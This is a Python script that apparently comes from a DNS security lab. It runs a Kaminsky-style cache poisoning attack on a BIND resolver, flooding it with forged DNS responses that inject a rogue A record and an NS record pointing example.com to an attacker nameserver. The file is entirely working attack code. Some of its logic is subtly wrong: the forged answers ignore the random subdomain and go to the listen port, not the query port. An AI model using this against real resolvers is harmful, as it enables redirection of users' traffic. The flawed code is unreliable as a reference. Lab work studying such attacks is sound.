#!/usr/bin/env python
import argparse
import socket
import string
import random

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 16-bit integer.
'''
def getRandomTXID():
	return randint(0, 65535)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

def genPoisonedPacket(fake,rand):
    serverName = "example.com"
    packet = (DNS(id=rand,qr=1,rd=1,nscount=1,ancount=1,
        qd=scapy.all.DNSQR(qname=serverName),
        an=scapy.all.DNSRR(rrname=serverName,type="A",rdata="1.2.3.4",ttl=92300),
        ns=scapy.all.DNSRR(rrname=serverName,type="NS",rdata="ns.dnslabattacker.net",ttl=93400)
        ))

    #packet.show()
    return packet

def sendBadDNSQuery():
    fakeName = getRandomSubDomain()+'.example.com'

    packetList = []
    for i in xrange(0,200):
        packetList.append(genPoisonedPacket(fakeName, getRandomTXID()))


    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=fakeName))
    sendPacket(sock, dnsPacket, my_ip, my_port)

    """
    sock.setblocking(False)
    while True:
        data = sock.recv(4096)
        if not data:
            sendPacket(sock, genPoisonedPacket(fakeName, getRandomTXID()), my_ip, my_port)
        else:
            break
    """
    for i in xrange(0,199):
        sendPacket(sock, packetList[i], my_ip, my_port)

    response = sock.recv(4096)
    response = DNS(response)
    """
    print "\n***** Packet Received from Remote Server *****"
    response.show()
    print "***** End of Remote Server Packet *****\n"
    """

def attack():
    for i in xrange(0,200):
        sendBadDNSQuery()

if __name__ == '__main__':
    attack()
    #exampleSendDNSQuery()